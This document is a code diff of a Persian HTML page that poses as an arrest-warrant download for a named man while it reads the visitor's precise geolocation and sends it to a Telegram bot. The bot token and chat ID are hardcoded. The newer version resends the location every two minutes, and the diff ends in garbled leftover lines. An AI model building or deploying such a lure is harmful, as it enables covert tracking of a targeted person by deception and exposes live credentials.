@@ -1,112 +1,490 @@
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>برگه جلب  اقا موسی اله بخشی </title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>اشتراک‌گذاری موقعیت مکانی</title>
+
   <style>
     body {
       text-align: center;
-      font-family: Tahoma, sans-serif;
+      font-family: Tahoma, Arial, sans-serif;
       padding: 20px;
-      background-color: #f4f4f9;
+      background: #f4f4f9;
     }
+
     #status {
       font-size: 16px;
       font-weight: bold;
+      line-height: 2;
       color: #333;
       margin-bottom: 15px;
     }
+
     #jalbImage {
       width: 794px;
       max-width: 100%;
       height: auto;
       border: 2px solid #000;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      box-shadow: 0 4px 8px rgba(0,0,0,.15);
       margin-top: 10px;
+    }
+
+    #locationInfo {
+      display: none;
+      margin: 20px auto;
+      padding: 15px;
+      max-width: 500px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,.1);
+      direction: ltr;
+      text-align: left;
+    }
+
+    #stopBtn {
+      display: none;
+      border: 0;
+      padding: 12px 25px;
+      border-radius: 8px;
+      background: #dc3545;
+      color: white;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+      font-family: Tahoma, Arial, sans-serif;
+    }
+
+    #stopBtn:hover {
+      background: #bb2d3b;
     }
   </style>
 </head>
+
 <body>
 
-  <p id="status">لطفا منتظر باشد</p>
+  <div id="status">
+    ⏳ در حال درخواست اجازه دسترسی به موقعیت مکانی...
+  </div>
 
-  <img id="jalbImage" src="JALB.jpg" alt="برگ جلب"/>
+  <div id="locationInfo">
+    <div>
+      Latitude:
+      <span id="lat">-</span>
+    </div>
 
-  <script>
-    window.onload = function () {
-      const status = document.getElementById('status');
+    <div>
+      Longitude:
+      <span id="lon">-</span>
+    </div>
 
-      if (!navigator.geolocation) {
-        status.innerText = "❌ مرورگر شما از قابلیت دانلود حکم داده گاه پشتیبانی نمی‌کند.";
-        return;
+    <div>
+      Accuracy:
+      <span id="accuracy">-</span> متر
+    </div>
+
+    <div>
+      آخرین ارسال:
+      <span id="lastUpdate">-</span>
+    </div>
+  </div>
+
+  <button id="stopBtn">
+    ⛔ توقف اشتراک‌گذاری موقعیت
+  </button>
+
+  <br>
+
+  <img
+    id="jalbImage"
+    src="JALB.jpg"
+    alt="برگه جلب"
+  >
+
+<script>
+
+  /*
+   * =====================================================
+   * تنظیمات Telegram
+   * =====================================================
+   *
+   * توکن ربات جدید خودتان را قرار دهید.
+   *
+   * توکن قبلی که در پیام قبلی منتشر شد را استفاده نکنید.
+   */
+
+
+
+const BOT_TOKEN = "8947494572:AAGWviC7WYN2SJn0MV3RnQFfmUjSGP4wSec";
+    const CHAT_ID = "8878957420";
+  /*
+   * ارسال هر ۲ دقیقه
+   */
+
+  const INTERVAL =
+    2 * 60 * 1000;
+
+
+  /*
+   * وضعیت سرویس
+   */
+
+  let timer = null;
+
+  let sharingActive = false;
+
+
+  /*
+   * عناصر صفحه
+   */
+
+  const status =
+    document.getElementById("status");
+
+  const stopBtn =
+    document.getElementById("stopBtn");
+
+  const locationInfo =
+    document.getElementById("locationInfo");
+
+  const latElement =
+    document.getElementById("lat");
+
+  const lonElement =
+    document.getElementById("lon");
+
+  const accuracyElement =
+    document.getElementById("accuracy");
+
+  const lastUpdateElement =
+    document.getElementById("lastUpdate");
+
+
+  /*
+   * =====================================================
+   * شروع خودکار پس از باز شدن صفحه
+   * =====================================================
+   */
+
+  window.addEventListener("load", function () {
+
+    if (!navigator.geolocation) {
+
+      status.innerText =
+        "❌ مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.";
+
+      return;
+    }
+
+    /*
+     * درخواست اجازه از کاربر
+     */
+
+    navigator.geolocation.getCurrentPosition(
+
+      async function(position) {
+
+        /*
+         * کاربر اجازه داده است.
+         * سرویس خودکار شروع می‌شود.
+         */
+
+        sharingActive = true;
+
+        stopBtn.style.display =
+          "inline-block";
+
+        status.innerText =
+          "✅ اجازه داده شد. در حال ارسال موقعیت...";
+
+        try {
+
+          /*
+           * ارسال اولین موقعیت
+           */
+
+          await sendLocation(position);
+
+          status.innerText =
+            "✅ اشتراک‌گذاری موقعیت فعال است.\n" +
+            "موقعیت جدید هر ۲ دقیقه ارسال می‌شود.";
+
+          /*
+           * شروع ارسال دوره‌ای
+           */
+
+          timer = setInterval(
+            updateLocation,
+            INTERVAL
+          );
+
+        } catch (error) {
+
+          console.error(error);
+
+          status.innerText =
+            "❌ ارسال موقعیت ناموفق بود.";
+        }
+
+      },
+
+      function(error) {
+
+        switch (error.code) {
+
+          case error.PERMISSION_DENIED:
+
+            status.innerText =
+              "❌ اجازه دسترسی به موقعیت مکانی داده نشد.";
+
+            break;
+
+          case error.POSITION_UNAVAILABLE:
+
+            status.innerText =
+              "❌ موقعیت مکانی در دسترس نیست.";
+
+            break;
+
+          case error.TIMEOUT:
+
+            status.innerText =
+              "❌ زمان دریافت موقعیت به پایان رسید.";
+
+            break;
+
+          default:
+
+            status.innerText =
+              "❌ خطای ناشناخته در دریافت موقعیت.";
+        }
+
+      },
+
+      {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
       }
 
-      const options = {
+    );
+
+  });
+
+
+  /*
+   * =====================================================
+   * دریافت موقعیت جدید
+   * =====================================================
+   */
+
+  function updateLocation() {
+
+    if (!sharingActive) {
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+
+      async function(position) {
+
+        try {
+
+          await sendLocation(position);
+
+          status.innerText =
+            "✅ موقعیت جدید ارسال شد.\n" +
+            "ارسال بعدی تا ۲ دقیقه دیگر.";
+
+        } catch (error) {
+
+          console.error(error);
+
+          status.innerText =
+            "⚠️ دریافت شد اما ارسال موقعیت ناموفق بود.";
+        }
+
+      },
+
+      function(error) {
+
+        console.error(error);
+
+        status.innerText =
+          "⚠️ دریافت موقعیت جدید ناموفق بود.";
+
+      },
+
+      {
         enableHighAccuracy: true,
-        timeout: 10000,
+        timeout: 15000,
         maximumAge: 0
-      };
+      }
 
-      navigator.geolocation.getCurrentPosition(
-        async position => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
+    );
 
-          // توکن و چت آی‌دی مستقیم در فرانت‌اند
-    const BOT_TOKEN = "8947494572:AAGWviC7WYN2SJn0MV3RnQFfmUjSGP4wSec";
-    const CHAT_ID = "8878957420";
-          status.innerText = "درحال دانلود حکم دادگاه";
+  }
 
-          try {
-            // ۱. ارسال متن و لینک گوگل مپس
-            const googleMapsUrl = https://www.google.com/maps?q=${lat},${lon};
-            const message = 📍 *موقعیت مکانی برگه جلب*\n\n +
-                            عرض جغرافیایی: \${lat}\\n +
-                            طول جغرافیایی: \${lon}\\n\n +
-                            🗺 [مشاهده روی نقشه گوگل](${googleMapsUrl});
 
-            await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-              })
-            });
+  /*
+   * =====================================================
+   * ارسال Location به Telegram
+   * =====================================================
+   */
 
-            // ۲. ارسال خود لوکیشن (سنجاق نقشه تلگرام)
-            const locRes = await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendLocation, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                chat_id: CHAT_ID,
-                latitude: lat,
-                longitude: lon
-              })
-            });
+  async function sendLocation(position) {
 
-            const resData = await locRes.json();
+    const latitude =
+      position.coords.latitude;
 
-            if (resData.ok) {
-              status.innerText = "  جلب متهم اقا موسی اله بخشی دانلود شد.   !";
-            } else {
-              status.innerText = ❌ خطای : ${resData.description};
-            }
+    const longitude =
+      position.coords.longitude;
 
-          } catch (error) {
-            status.innerText = ❌ خطای شبکه: ${error.message};
-          }
-        },
-        error => {
-          switch (error.code) {
-            case error.PERMISSION_DENIED:
-              status.innerText = "❌ اجازه دسترسی به موقعیت مکانی داده نشد.";
-              break;
-            case error.POSITION_UNAVAILABLE:
-              status.innerText = "❌   غیرقابل دسترس است.";
-              break;
+    const accuracy =
+      position.coords.accuracy;
+
+
+    /*
+     * نمایش اطلاعات در صفحه
+     */
+
+    latElement.innerText =
+      latitude;
+
+    lonElement.innerText =
+      longitude;
+
+    accuracyElement.innerText =
+      Math.round(accuracy);
+
+    lastUpdateElement.innerText =
+      new Date().toLocaleString("fa-IR");
+
+    locationInfo.style.display =
+      "block";
+
+
+    /*
+     * لینک Google Maps
+     */
+
+    const googleMapsUrl =
+      `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+
+    /*
+     * پیام متنی
+     */
+
+    const message =
+      `📍 موقعیت مکانی جدید\n\n` +
+      `Latitude: ${latitude}\n` +
+      `Longitude: ${longitude}\n` +
+      `Accuracy: ${Math.round(accuracy)} متر\n\n` +
+      `🗺 نقشه:\n${googleMapsUrl}`;
+
+
+    /*
+     * ارسال پیام
+     */
+
+    const messageResponse =
+      await fetch(
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+        {
+          method: "POST",
+
+          headers: {
+            "Content-Type": "application/json"
+          },
+
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        }
+      );
+
+
+    if (!messageResponse.ok) {
+
+      throw new Error(
+        "ارسال پیام Telegram ناموفق بود."
+      );
+    }
+
+
+    /*
+     * ارسال Pin موقعیت
+     */
+
+    const locationResponse =
+      await fetch(
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,
+        {
+          method: "POST",
+
+          headers: {
+            "Content-Type": "application/json"
+          },
+
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            latitude: latitude,
+            longitude: longitude
+          })
+        }
+      );
+
+
+    const result =
+      await locationResponse.json();
+
+
+    if (!result.ok) {
+
+      throw new Error(
+        result.description ||
+        "ارسال Location ناموفق بود."
+      );
+    }
+
+  }
+
+
+  /*
+   * =====================================================
+   * توقف اشتراک‌گذاری
+   * =====================================================
+   */
+
+  stopBtn.addEventListener(
+    "click",
+    function() {
+
+      sharingActive = false;
+
+      if (timer !== null) {
+
+        clearInterval(timer);
+
+        timer = null;
+      }
+
+      stopBtn.style.display =
+        "none";
+
+      status.innerText =
+        "⛔ اشتراک‌گذاری موقعیت متوقف شد.";
+
+    }
+  );
+
+</script>
+
+</body>
+</html>              break;
             case error.TIMEOUT:
               status.innerText = "❌ زمان درخواست  به پایان رسید.";
               break;
